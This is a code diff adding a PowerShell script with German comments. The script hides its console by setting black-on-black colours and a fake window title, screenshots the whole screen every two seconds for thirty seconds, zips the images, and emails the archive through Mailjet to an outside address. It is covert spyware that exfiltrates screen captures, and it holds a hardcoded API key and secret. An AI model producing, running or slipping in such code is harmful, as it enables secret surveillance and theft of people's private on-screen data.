@@ -1,0 +1,80 @@
+#Gesamter Code
+#Fehlt:
+
+# Farbe der Powershell ändern
+function changeColor() {
+	$Host.ui.rawui.backgroundcolor = "Black"
+	$Host.ui.rawui.foregroundcolor = "Black"
+	$hosttime = (Get-ChildItem -Path  $PSHOME\\PowerShell.exe).CreationTime
+	$Host.UI.RawUI.WindowTitle  =  "PowerShell ($hosttime)"
+	Clear-Host
+}
+ 
+
+# Temporären Ordner erstellen
+function newTempDir(){
+	$time=Get-Date -Format 'yyyyMMdd_HHmmss'
+	$tmp = [System.IO.Path]::GetTempPath()
+	New-Item -ItemType Directory -Path (Join-Path $tmp shots)}
+	
+	# Intervallmäßig Screenshots erstellen (z.B. alle 2 Sekunden)
+function screenshot(){
+	# Macht den Prozess DPI-aware (wichtig bei Skalierung)
+	Add-Type -TypeDefinition @"
+using System;
+	using System.Runtime.InteropServices;
+	public class DPI
+	{
+	    [DllImport("user32.dll")]
+	    public static extern bool SetProcessDPIAware();}
+"@
+	[DPI]::SetProcessDPIAware()
+
+# While-Schleife ist für 30 Sekunden aktiv
+	$startTime = Get-Date
+	$duration = [TimeSpan]::FromSeconds(30)
+	while((Get-Date) -lt ($startTime + $duration)){
+		Add-Type -AssemblyName System.Windows.Forms
+		Add-Type -AssemblyName System.Drawing
+
+		$time=Get-Date -Format 'yyyyMMdd_HHmmss'
+		$tmp = [System.IO.Path]::GetTempPath()
+		$path="$tmp\shots\\$time.png\"
+
+		$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+		$bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+		$graphics = [Drawing.Graphics]::FromImage($bmp)
+		$graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
+	
+		$bmp.Save($path)
+		
+		Start-Sleep -Seconds 2;}
+}
+
+#Alles aufrufen
+changeColor
+newTempDir
+screenshot
+
+
+# Alle Daten in shots innerhalb einer Zip speichern
+$tmp = [System.IO.Path]::GetTempPath()
+Compress-Archive -Path "$tmp\shots"  -DestinationPath "$tmp\shots\archive.zip"
+
+# Absender und Empfänger
+$from = "meinezips@proton.me" #Mailjet
+$to = "zip_zip@gmx.de"
+$subject = "Test"
+$body = "hi"
+$attachment = "$env:TEMP\shots\archive.zip"
+
+# API Key und Secret
+$apiKey = "f08cb272e8da9d34296718872ea167dc"
+$secretKey = "5818b7161558a3d1062a87193714d354"
+$securePassword = ConvertTo-SecureString $secretKey -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential($apiKey, $securePassword)
+
+# E-Mail senden
+Send-MailMessage -From $from -To $to -Subject $subject -Body $body `
+-SmtpServer "in-v3.mailjet.com" -Port 587 -UseSsl -Credential $cred `
+-Attachments $attachment
